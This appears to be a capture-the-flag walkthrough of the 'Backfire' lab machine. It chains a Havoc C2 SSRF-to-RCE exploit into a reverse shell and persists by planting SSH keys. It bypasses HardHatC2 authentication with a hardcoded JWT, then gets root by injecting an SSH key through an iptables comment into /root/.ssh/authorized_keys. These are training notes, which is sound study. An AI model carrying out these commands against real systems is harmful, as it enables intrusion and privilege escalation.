## Backfire

### Lab Details 

- Difficulty: Medium
- Type: Web Enumeration, Port Fowarding, Priv Esc, Linux

#### Enumeration
- run nmap
- found open ports `22,443,5000,7096,8000`
- visit `http://target:8000` found file listing
![[file listing.png]]
- download the two files 
- the file `havoc.yaotl` is a config file for `Havoc C2` and contains info like user credentials to the C2 server
- the `disabler_tls.patch` contains info on the C2 server and its specifying the usage of web socket on `/havoc/` endpoint
#### Initial Foothold 
- searching for `Havoc vulnerabilies`
-  found blog post on `SSRF` (https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/)
- found another post on `RCE (https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce)
- chaining the `SSRF` with `RCE`
- use exploit at `https://github.com/Ch4os1/CVE-2024-4157-SSRF-RCE/`
![[exploit reverse shell.png]]
- get reverse shell on `nc`
![[reverse shell ilya.png]]
- investigate user's home directory found `.ssh`
```bash
ilya@backfire:~$ ls .ssh
ls .ssh
authorized_keys
ilya@backfire:~$ pwd
pwd
/home/ilya
```
- creating a key pair for `ssh`
```bash
$ ssh-keygen -t ed25519
```
- add ingthe public key to the remote `authorized_keys` file at user's home directory
```bash
ilya@backfire:~/Havoc/payloads/Demon$ echo -n "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICvD4YiCm8apPd0VQ8aRcHzofunOXJY+J/eZyPUeOn72 ch4os1@htb-rfysv4ujwh" > ~/.ssh/authorized_keys 
```
- we can ssh into target as `ilya`
```bash
$ ssh ilya@backfire.htb -i ./id_ed25519 
The authenticity of host 'backfire.htb (10.129.150.254)' can't be established.
ED25519 key fingerprint is SHA256:vKC7A11sFxQLRppUMt01q0d/DPREoskH4Aa42t0Bz9M.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'backfire.htb' (ED25519) to the list of known hosts.
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
ilya@backfire:~$ whoami
ilya
```

#### Lateral Movement (If any)
```bash
ilya@backfire:~$ cat hardhat.txt 
Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C# 
```
- searching for HardHatC2 and found repo (https://github.com/DragoQCC/CrucibleC2)
- we can access it on `port 7096`
![[hardhatc2.png]]
- checking local opened ports and found `port 7096 & 5000`
![[open local ports ilya.png]]
- search for HardHatC2 vulnerabilities and found post (https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7)
- according to the post HardHatC2 uses a hardcoded JWT token which we can use exploit this by  spinning up a local docker instance of the app and log in as Administrator, and then use the same token on the target instance
- use `git clone` to fetch the repo then `docker compose up` to spin up the instance
- while creating the instances it logs out the admin credentials
```bash
$ sudo docker compose up
<snip>
hardhat_server  | [**] HardHat_Admin's password is Iz32lLtvv?Qt*Wbx!wiD, make sure to save this password, as on the next start of the server it will not be displayed again [**]
hardhat_server  | [**] Default admin account; SAVE THIS PASSWORD; it will not be displayed again [**]
hardhat_server  |     Username: HardHat_Admin
hardhat_server  |     Password: Iz32lLtvv?Qt*Wbx!wiD
<snip>
```
- login to HardHatC2 on `https://localhost:7096`
- then stop the docker instance and local port forward so we can access the HardHatC2 instance on the target
```bash
$ ssh -N -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096 ilya@10.129.126.93 -i ./id_ed25519
```
- refresh the page we can are logged in
- create a new user 
![[hardhatc2 create user.png]]
- then login to the target instance with the new user
![[hardhcatc2 attacker login.png]]
- we can interact with target via the terminal 
- create a reverse shell payload and send through
![[hardhatc2 terminal.png]]
- we get a shell back as `sergej`
![[reverse shell sergj.png]]
- add our ssh key to user home directory `.ssh`
- ssh into target as `sergej`
![[ssh sergej.png]]
#### Privilege Escalation
- run `sudo -l`
![[Medium/Unix/Backfire/sudo -l.png]]
- search for `iptables priv esc`, found (https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/)
- according to the blog we can perform injection to files by injection line breaks into the `iptables` comments
- attempt with injection our public key into the root users `.ssh/authorized_keys`
```bash
sergej@backfire:~$ sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICvD4YiCm8apPd0VQ8aRcHzofunOXJY+J/eZyPUeOn72 ch4os1@htb-rfysv4ujwh\n'
sergej@backfire:~$ sudo iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i lo -m comment --comment "
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICvD4YiCm8apPd0VQ8aRcHzofunOXJY+J/eZyPUeOn72 ch4os1@htb-rfysv4ujwh
" -j ACCEPT
sergej@backfire:~$ sudo iptables-save -f /root/.ssh/authorized_keys
```
- we can ssh into the target as root user after the exploit
![[ssh root.png]]
#### Resources

#### Lesson Learned
- Learned C2 internal workings
- Exploiting open source C2 vulnerabilities 
